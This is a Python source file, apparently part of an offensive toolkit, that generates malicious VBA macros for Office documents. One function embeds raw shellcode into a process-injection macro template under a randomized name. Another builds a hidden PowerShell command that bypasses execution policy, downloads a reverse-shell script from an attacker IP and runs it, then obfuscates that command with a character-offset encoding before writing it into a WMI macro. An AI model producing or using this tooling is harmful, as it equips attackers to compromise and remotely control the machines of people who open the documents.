import multiprocessing
import random
import string
import subprocess

def t1(ip,shellcode,rop,xor):
    shellcode = shellcode['7']
    shellcode = raw2vbapplication(shellcode)
    bufname = random_name()
    shellcode = bufname+shellcode
    with open("data/vba/inject.txt","r") as f:
        content = f.read()
    content = content.format(rop=rop,xor=xor,bufname=bufname,shellcode=shellcode)

    with open("out/other/inject.vba","w") as f:
        f.write(content)

def t2(ip,shellcode,rop,xor):
    strcmd = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://"+ip+"/out/ps1/rev1.ps1'))"
    ecmd = encrypt_command(strcmd)
    with open("data/vba/wmi.txt","r") as f:
        content = f.read()
    content = content.format(command=ecmd)
    with open("out/other/wmi.vba","w") as f:
        f.write(content)


def generate_vba(ip,shellcode,addition):
    t1(ip,shellcode,addition[0],addition[1])
    t2(ip,shellcode,addition[0],addition[1])
    pass

def random_name():
    length = random.randint(4,8)
    return ''.join(random.choices(string.ascii_letters, k=length))

def raw2vbapplication(shellcode):
    vba = " = Array(" 
    for i in range(0,len(shellcode)//8):
        if (i+1)*81 <len(shellcode):
            p = ",".join("{:d}".format(num) for num in shellcode[i*81:(i+1)*81])
        else:
            p = ",".join("{:d}".format(num) for num in shellcode[i*81:]) 
            vba = vba + p + ")"
            return vba
        vba = vba + p + ", _\n"


def encrypt_command(command):
    res = ""
    for i in command:
        c = str(ord(i) + 17)
        if len(c) == 1:
            c = '00' + c
        elif len(c) == 2:
            c = '0' + c
        res += c
    return res